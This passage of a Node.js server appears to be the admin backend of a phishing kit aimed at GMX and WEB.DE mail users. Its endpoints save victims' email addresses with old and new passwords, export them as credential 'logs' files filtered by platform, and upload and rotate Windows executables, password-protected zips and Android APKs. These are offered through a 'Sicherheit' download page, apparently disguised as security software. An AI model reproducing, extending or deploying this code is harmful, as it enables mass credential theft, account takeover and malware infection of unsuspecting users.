        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      
      const email = (lead.email || '').trim();
      const password = (lead.password || '').trim();
      const newPassword = lead.changePasswordData && (lead.changePasswordData.newPassword || '').trim();
      
      console.log('[SERVER] /api/save-credentials: email=', maskEmail(email), 'hasPassword=', !!password, 'hasNewPassword=', !!newPassword);
      
      if (!email || !password) {
        console.error('[SERVER] /api/save-credentials: отсутствует email или пароль');
        return send(res, 400, { ok: false, error: 'Email или пароль отсутствуют' });
      }
      
      const credentials = readSavedCredentials();
      console.log('[SERVER] /api/save-credentials: текущее количество сохраненных:', credentials.length);
      const credentialText = email + ':' + password + (newPassword ? ' | ' + newPassword : '');
      const credentialData = {
        id: Date.now().toString(36) + Math.random().toString(36).slice(2),
        email: email,
        password: password,
        newPassword: newPassword || null,
        credentialText: credentialText,
        savedAt: new Date().toISOString()
      };
      
      credentials.push(credentialData);
      writeSavedCredentials(credentials);
      console.log('[SERVER] /api/save-credentials: данные сохранены, новое количество:', credentials.length);
      
      writeDebugLog('SAVE_CREDENTIALS', { 
        id: id, 
        email: email,
        hasNewPassword: !!newPassword,
        credentialId: credentialData.id,
        totalSaved: credentials.length
      });
      
      send(res, 200, { ok: true, credential: credentialData });
    });
    return;
  }

  if (pathname === '/api/get-saved-credentials' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const credentials = readSavedCredentials();
    return send(res, 200, credentials);
  }

  if (pathname === '/api/delete-saved-credential' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const credentialId = json.id;
      if (!credentialId || typeof credentialId !== 'string') return send(res, 400, { ok: false });
      
      const credentials = readSavedCredentials();
      const filtered = credentials.filter((c) => c.id !== credentialId);
      if (filtered.length === credentials.length) return send(res, 404, { ok: false });
      
      writeSavedCredentials(filtered);
      send(res, 200, { ok: true });
    });
    return;
  }

  if (pathname === '/api/mode' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const data = readModeData();
    const canonicalBaseGmx = 'https://' + GMX_DOMAIN;
    const canonicalBaseWebde = 'https://' + WEBDE_CANONICAL_HOST;
    return send(res, 200, { mode: data.mode, autoScript: data.autoScript, canonicalBase: canonicalBaseGmx, canonicalBaseGmx, canonicalBaseWebde });
  }

  if (pathname === '/api/mode' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const mode = json.mode === 'manual' ? 'manual' : (json.mode === 'auto' ? 'auto' : undefined);
      const autoScript = json.autoScript !== undefined ? !!json.autoScript : undefined;
      writeMode(mode, autoScript);
      const data = readModeData();
      send(res, 200, { ok: true, mode: data.mode, autoScript: data.autoScript });
    });
    return;
  }

  if (pathname === '/api/start-page' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, { startPage: readStartPage() });
  }

  if (pathname === '/api/start-page' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const sp = json.startPage != null ? String(json.startPage).trim().toLowerCase() : '';
      const value = sp === 'login' ? 'login' : sp === 'change' ? 'change' : sp === 'download' ? 'download' : sp === 'klein' ? 'klein' : 'login';
      writeStartPage(value);
      send(res, 200, { ok: true, startPage: value });
    });
    return;
  }

  if (pathname === '/api/export-logs' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const type = (q.type && String(q.type).trim()) || 'credentials';
    let leads = readLeads();
    const platformsParam = q.platforms;
    const knownPlatforms = ['windows', 'macos', 'android', 'ios'];
    if (platformsParam) {
      const list = typeof platformsParam === 'string' ? platformsParam.split(',') : Array.isArray(platformsParam) ? platformsParam : [];
      const set = new Set(list.map((p) => String(p).trim().toLowerCase()).filter(Boolean));
      if (set.size > 0) {
        leads = leads.filter((lead) => {
          const p = (lead.platform || '').toLowerCase();
          const isUnknown = !p || !knownPlatforms.includes(p);
          if (set.has('unknown') && isUnknown) return true;
          if (knownPlatforms.includes(p) && set.has(p)) return true;
          return false;
        });
      }
    }
    const emailTrim = (s) => (s != null ? String(s).trim() : '') || '';
    const seen = new Map();
    if (type === 'credentials') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        const password = (lead.password != null ? String(lead.password) : '').trim();
        if (email && password) {
          const line = email + ':' + password;
          seen.set(line, line);
        }
      });
    } else if (type === 'all_emails') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (email) seen.set(email, email);
      });
    } else if (type === 'all_email_pass') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const password = (lead.password != null ? String(lead.password) : '').trim();
        const line = email + ':' + (password || '');
        seen.set(line, line);
      });
    } else if (type === 'all_email_old_new') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
        const arr = history.map((p) => (typeof p === 'object' && p && p.p != null ? String(p.p).trim() : (p != null ? String(p).trim() : '')));
        const current = (lead.password != null ? String(lead.password) : '').trim();
        let oldP = '-';
        let newP = current || '-';
        if (arr.length >= 2) {
          oldP = arr[0] || '-';
          newP = arr[arr.length - 1] || current || '-';
        } else if (arr.length === 1) {
          newP = arr[0] || '-';
        }
        const line = email + ':' + oldP + '\t' + newP;
        seen.set(line, line);
      });
    } else {
      return send(res, 400, { ok: false, error: 'Invalid type' });
    }
    const lines = Array.from(seen.values());
    const body = lines.join('\n') + (lines.length ? '\n' : '');
    const filename = type === 'credentials' ? 'logs-email-password.txt' : type === 'all_emails' ? 'logs-emails.txt' : type === 'all_email_pass' ? 'logs-all-email-pass.txt' : 'logs-email-old-new.txt';
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Content-Type': 'text/plain; charset=utf-8',
      'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(filename) + '"',
      'Cache-Control': 'no-store'
    });
    res.end(body);
    return;
  }

  if (pathname === '/api/config/download' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getSicherheitDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readDownloadFilesConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readDownloadLimits();
      limits[name] = limit;
      writeDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return;
  }

  if (pathname === '/api/config/download-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let zipPassword = '';
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          } else if (fieldName === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (zipPassword) writeZipPassword(zipPassword);
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const original = path.basename(files[i].filename).replace(/\.\./g, '').replace(/[/\\]/g, '') || 'download';
        const ext = (path.extname(original) || '').toLowerCase();
        const safeExt = /^\.([a-zA-Z0-9]+)$/.test(ext) ? ext : '.bin';
        const base = (path.basename(original, ext) || 'download').replace(/[^a-zA-Z0-9._-]/g, '_');
        let slotName = base + safeExt;
        let n = 1;
        while (newList.indexOf(slotName) !== -1) {
          slotName = base + '-' + (++n) + safeExt;
        }
        const buf = body.slice(files[i].start, files[i].end);
        try {
          const fullPath = path.join(DOWNLOADS_DIR, slotName);
          fs.writeFileSync(fullPath, buf);
          newList.push(slotName);
          if (limits[slotName] === undefined) limits[slotName] = DEFAULT_DOWNLOAD_LIMIT;
          counts[slotName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeDownloadFilesConfig(newList);
      writeDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getSicherheitDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return;
  }

  if (pathname === '/api/config/download' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) {
              fileStart = bodyStart;
              fileEnd = partEnd;
            }
          } else if (nameMatch && nameMatch[1] === 'zipPassword') {
            zipPassword = body.slice(bodyStart, partEnd).toString('utf8').trim();
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const safeName = path.basename(filename) || 'download';
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        const names = fs.readdirSync(DOWNLOADS_DIR);
        for (let i = 0; i < names.length; i++) {
          const n = names[i];
          const lower = n.toLowerCase();
          if ((lower.endsWith('.exe') || lower.endsWith('.zip')) && n !== safeName) {
            try {
              fs.unlinkSync(path.join(DOWNLOADS_DIR, n));
            } catch (e) {}
          }
        }
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const result = { ok: true, fileName: safeName };
        if (path.extname(safeName).toLowerCase() !== '.zip') {
          send(res, 200, result);
          return;
        }
        let responded = false;
        const finishWithEntries = (entries) => {
          if (responded) return;
          responded = true;
          result.zipEntries = Array.isArray(entries) ? entries.filter(n => n && !n.endsWith('/')) : [];
          send(res, 200, result);
        };
        const parseUnzipList = (out) => {
          const entries = [];
          const lines = (out || '').split('\n');
          let inTable = false;
          for (const line of lines) {
            if (line.includes('-------')) { inTable = !inTable; continue; }
            let name = null;
            const m = inTable && line.match(/^\s*\d+\s+\S+\s+\S+\s+(.*)$/);
            if (m) name = m[1].trim();
            else if (inTable && /^\s*\d+/.test(line)) {
              const parts = line.trim().split(/\s{2,}/);
              if (parts.length >= 4 && /^\d+$/.test(parts[0])) name = parts.slice(3).join(' ').trim();
            }
            if (name && !/^\d+ files?$/.test(name) && !name.endsWith('/')) entries.push(name);
          }
          return entries;
        };
        const tryUnzipList = () => {
          const runUnzip = (usePassword) => {
            const env = usePassword ? { ...process.env, GMW_ZIP_OLD: zipPassword } : process.env;
            const cmd = usePassword
              ? 'unzip -l -P "$GMW_ZIP_OLD" ' + JSON.stringify(targetPath) + ' 2>&1'
              : 'unzip -l ' + JSON.stringify(targetPath) + ' 2>&1';
            const r = spawnSync(process.platform === 'win32' ? 'cmd' : 'sh', [process.platform === 'win32' ? '/c' : '-c', cmd], { encoding: 'utf8', env });
            return (r.stdout || '') + (r.stderr || '');
          };
          let out = runUnzip(!!zipPassword);
          let list = parseUnzipList(out);
          if (list.length === 0 && zipPassword) out = runUnzip(false);
          if (list.length === 0) list = parseUnzipList(out);
          if (list.length === 0) console.log('[SERVER] config/download zip list empty, hadPassword=', !!zipPassword, 'passLen=', (zipPassword || '').length, 'path=', targetPath);
          else console.log('[SERVER] config/download zipEntries=', list.length, list[0]);
          finishWithEntries(list);
        };
        if (zipPassword) {
          tryUnzipList();
          return;
        }
        yauzl.open(targetPath, { lazyEntries: true }, (err, zipfile) => {
          if (err || !zipfile) {
            tryUnzipList();
            return;
          }
          const entries = [];
          const onError = () => { try { finishWithEntries(entries.length ? entries : []); } catch (e) { finishWithEntries([]); } };
          zipfile.on('error', onError);
          try {
            zipfile.readEntry();
          } catch (e) {
            tryUnzipList();
            return;
          }
          zipfile.on('entry', (entry) => {
            try {
              if (entry.fileName && !entry.fileName.endsWith('/')) entries.push(entry.fileName);
              zipfile.readEntry();
            } catch (e) {
              onError();
            }
          });
          zipfile.on('end', () => { try { finishWithEntries(entries); } catch (e) { finishWithEntries(entries.length ? entries : []); } });
        });
      } catch (e) {
        const errMsg = (e && e.message) ? e.message : String(e);
        send(res, 500, { ok: false, error: errMsg || 'Server error' });
      }
    });
    return;
  }

  if (pathname === '/api/config/download-android' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const files = getAndroidDownloadFiles();
    return send(res, 200, { files });
  }

  if (pathname === '/api/config/download-android-limit' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const index = json.index != null ? parseInt(json.index, 10) : -1;
      let limit = json.limit != null ? parseInt(String(json.limit), 10) : -1;
      if (limit < 0) limit = 0;
      const config = readAndroidDownloadConfig();
      const name = (fileName && !fileName.includes('..') && !fileName.includes(path.sep))
        ? path.basename(fileName)
        : (index >= 0 && index < config.length ? config[index] : null);
      if (!name) return send(res, 400, { ok: false, error: 'fileName or index required' });
      const limits = readAndroidDownloadLimits();
      limits[name] = limit;
      writeAndroidDownloadLimits(limits);
      return send(res, 200, { ok: true, fileName: name, limit });
    });
    return;
  }

  if (pathname === '/api/config/download-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readDownloadFilesConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Windows config' });
      const newList = config.slice();
      newList[idx] = null;
      writeDownloadFilesConfig(newList);
      const limits = readDownloadLimits();
      delete limits[safeName];
      writeDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return;
  }

  if (pathname === '/api/config/download-android-delete' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const fileName = (json.fileName != null) ? String(json.fileName).trim() : '';
      const safeName = (fileName && !fileName.includes('..') && !fileName.includes(path.sep)) ? path.basename(fileName) : '';
      if (!safeName) return send(res, 400, { ok: false, error: 'fileName required' });
      const config = readAndroidDownloadConfig();
      const idx = config.indexOf(safeName);
      if (idx === -1) return send(res, 404, { ok: false, error: 'File not in Android config' });
      const newList = config.slice();
      newList[idx] = null;
      writeAndroidDownloadConfig(newList);
      const limits = readAndroidDownloadLimits();
      delete limits[safeName];
      writeAndroidDownloadLimits(limits);
      const counts = readDownloadCounts();
      delete counts[safeName];
      writeDownloadCounts(counts);
      const fullPath = path.join(DOWNLOADS_DIR, safeName);
      try { if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath); } catch (e) {}
      return send(res, 200, { ok: true, deleted: safeName });
    });
    return;
  }

  if (pathname === '/api/config/download-reset-counts' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android' || json.platform === 'all') ? json.platform : 'all';
      const counts = readDownloadCounts();
      if (platform === 'all') {
        writeDownloadCounts({});
        return send(res, 200, { ok: true, cleared: 'all' });
      }
      const names = platform === 'windows'
        ? readDownloadFilesConfig().filter(Boolean)
        : readAndroidDownloadConfig().filter(Boolean);
      for (let i = 0; i < names.length; i++) {
        delete counts[names[i]];
      }
      writeDownloadCounts(counts);
      return send(res, 200, { ok: true, cleared: platform });
    });
    return;
  }

  if (pathname === '/api/config/download-rotate-next' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const platform = (json.platform === 'windows' || json.platform === 'android') ? json.platform : null;
      if (!platform) return send(res, 400, { ok: false, error: 'platform required: windows or android' });
      const state = readDownloadRotation();
      const key = platform === 'android' ? 'android' : 'windows';
      const block = state[key];
      if (!block) return send(res, 500, { ok: false });
      block.totalUnique = (block.totalUnique || 0) + 1;
      writeDownloadRotation(state);
      return send(res, 200, { ok: true, platform, totalUnique: block.totalUnique });
    });
    return;
  }

  if (pathname === '/api/config/download-android-upload-multi' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      const files = [];
      let idx = body.indexOf(boundaryPrefix);
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          const fieldName = nameMatch ? nameMatch[1].replace(/\s*\[\]$/, '') : '';
          if ((fieldName === 'file' || fieldName === 'files') && fileMatch) {
            const filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) files.push({ filename, start: bodyStart, end: partEnd });
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (files.length === 0) return send(res, 400, { ok: false, error: 'Нет файлов' });
      if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
      const newList = [];
      const limits = readAndroidDownloadLimits();
      const counts = readDownloadCounts();
      const maxFiles = Math.min(files.length, DOWNLOAD_SLOTS_COUNT);
      for (let i = 0; i < maxFiles; i++) {
        const base = path.basename(files[i].filename) || 'android';
        const ext = path.extname(base).toLowerCase() || '.apk';
        const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
        const fullPath = path.join(DOWNLOADS_DIR, safeName);
        try {
          const buf = body.slice(files[i].start, files[i].end);
          fs.writeFileSync(fullPath, buf);
          newList.push(safeName);
          if (limits[safeName] === undefined) limits[safeName] = DEFAULT_DOWNLOAD_LIMIT;
          counts[safeName] = 0;
        } catch (e) {
          return send(res, 500, { ok: false, error: 'Ошибка записи файла' });
        }
      }
      while (newList.length < DOWNLOAD_SLOTS_COUNT) newList.push(null);
      writeAndroidDownloadConfig(newList);
      writeAndroidDownloadLimits(limits);
      try {
        if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
        fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
      } catch (e) {}
      const out = getAndroidDownloadFiles();
      return send(res, 200, { ok: true, files: out, uploadedCount: maxFiles });
    });
    return;
  }

  if (pathname === '/api/config/download-settings' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const cfg = readDownloadSettings();
    const rot = readDownloadRotation();
    return send(res, 200, {
      rotateAfterUnique: cfg.rotateAfterUnique,
      windowsUnique: rot.windows.totalUnique,
      androidUnique: rot.android.totalUnique
    });
  }

  if (pathname === '/api/config/download-settings' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const n = json.rotateAfterUnique;
      const val = typeof n === 'number' && n >= 0 ? n : (parseInt(String(n || '0'), 10) >= 0 ? parseInt(String(n), 10) : 0);
      writeDownloadSettings({ rotateAfterUnique: val });
      return send(res, 200, { ok: true, rotateAfterUnique: val });
    });
    return;
  }

  if (pathname === '/api/config/download-android' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let slotIndex = 0;
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
        if (body[partStart] === 13 || body[partStart] === 10) partStart += body[partStart] === 13 && body[partStart + 1] === 10 ? 2 : 1;
        const nextBoundary = body.indexOf(boundaryBuf, partStart);
        const partEnd = nextBoundary === -1 ? body.length : nextBoundary;
        const headEnd = body.indexOf(Buffer.from('\r\n\r\n', 'utf8'), partStart);
        if (headEnd !== -1 && headEnd < partEnd) {
          const headers = body.slice(partStart, headEnd).toString('utf8');
          const nameMatch = headers.match(/name="([^"]+)"/);
          const fileMatch = headers.match(/filename="([^"]+)"/);
          const bodyStart = headEnd + 4;
          if (fileMatch && nameMatch && nameMatch[1] === 'file') {
            filename = fileMatch[1].replace(/^.*[\\/]/, '').trim();
            if (filename) { fileStart = bodyStart; fileEnd = partEnd; }
          } else if (nameMatch && nameMatch[1] === 'slotIndex') {
            const val = body.slice(bodyStart, partEnd).toString('utf8').trim();
            const n = parseInt(val, 10);
            if (n >= 0 && n < DOWNLOAD_SLOTS_COUNT) slotIndex = n;
          }
        }
        idx = nextBoundary === -1 ? -1 : nextBoundary;
      }
      if (!filename || fileStart === -1) return send(res, 400, { ok: false, error: 'No file' });
      const base = path.basename(filename) || 'android';
      const ext = path.extname(base).toLowerCase() || '.apk';
      const safeName = (base.replace(/\.[^.]+$/, '') || 'android').replace(/[^a-zA-Z0-9._-]/g, '_') + ext;
      const targetPath = path.join(DOWNLOADS_DIR, safeName);
      try {
        if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
        fs.writeFileSync(targetPath, body.slice(fileStart, fileEnd));
        const config = readAndroidDownloadConfig();
        config[slotIndex] = safeName;
        writeAndroidDownloadConfig(config);
        return send(res, 200, { ok: true, fileName: safeName, slotIndex });
      } catch (e) {
        return send(res, 500, { ok: false, error: (e && e.message) || 'Write failed' });
      }
    });
    return;
  }

  if (pathname === '/api/config/check' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    if (!checkRateLimit(ip, 'configUpload', RATE_LIMITS.configUpload)) return send(res, 429, { ok: false, error: 'too_many_requests' });
    const contentType = (req.headers['content-type'] || '').toLowerCase();
    if (contentType.indexOf('multipart/form-data') === -1) {
      return send(res, 400, { ok: false, error: 'Expect multipart/form-data' });
    }
    const boundaryMatch = contentType.match(/boundary=([^;\s]+)/);
    const boundary = boundaryMatch ? boundaryMatch[1].trim().replace(/^["']|["']$/g, '') : null;
    if (!boundary) return send(res, 400, { ok: false, error: 'No boundary' });
    const chunks = [];
    req.on('data', (chunk) => { chunks.push(chunk); });
    req.on('end', () => {
      const body = Buffer.concat(chunks);
      const boundaryPrefix = Buffer.from('--' + boundary, 'utf8');
      const boundaryBuf = Buffer.from('\r\n--' + boundary, 'utf8');
      let idx = body.indexOf(boundaryPrefix);
      if (idx === -1) return send(res, 400, { ok: false, error: 'Invalid multipart' });
      let filename = null;
      let fileStart = -1;
      let fileEnd = body.length;
      let zipPassword = '';
      while (idx !== -1) {
        let partStart = idx + boundaryPrefix.length;
        if (body[partStart] === 45 && body[partStart + 1] === 45) break;
